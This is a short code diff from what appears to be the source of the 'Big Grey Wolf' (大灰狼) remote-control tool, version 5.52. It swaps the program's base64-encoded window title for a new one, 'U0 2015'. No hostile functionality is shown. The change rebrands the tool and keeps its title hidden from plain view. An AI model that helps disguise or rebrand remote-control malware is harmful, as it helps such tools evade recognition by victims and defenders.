@@ -472,7 +472,8 @@ BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
 
 //加密标题代码区开始
 //	stra1=Dig.Base64Encode(JM_szName);  //加密标题  大灰狼远控V5.52（2013稳定版）
-	char JS_szName[] = {"tPO70sDH1LazzLncwO3I7bz+INfu0MLQ3rjERE9TU7Dm"}; //加密后标题
+	//char JS_szName[] = {"tPO70sDH1LazzLncwO3I7bz+INfu0MLQ3rjERE9TU7Dm"}; //加密后标题
+	char JS_szName[] = { "VTAgMjAxNQ==" };		//U0 2015
 	stra1=Dig.Base64Decode(JS_szName);      //解密标题
 	cs.lpszName = stra1;
 
